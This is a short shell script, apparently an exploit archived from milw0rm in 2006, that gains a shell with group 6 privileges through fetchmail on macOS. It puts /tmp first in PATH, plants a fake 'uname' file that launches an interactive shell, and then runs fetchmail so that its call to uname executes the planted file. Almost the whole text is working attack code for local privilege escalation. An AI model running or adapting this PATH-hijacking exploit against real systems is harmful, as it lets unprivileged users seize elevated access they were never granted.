#!/bin/sh
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# Previously undisclosed local fetchmail issue. This takes setgid=6
#
# http://docs.info.apple.com/article.html?artnum=106704

export PATH=/tmp:$PATH
echo /bin/sh -i > /tmp/uname
chmod +x /tmp/uname
/usr/bin/fetchmail -V

# milw0rm.com [2006-08-01]
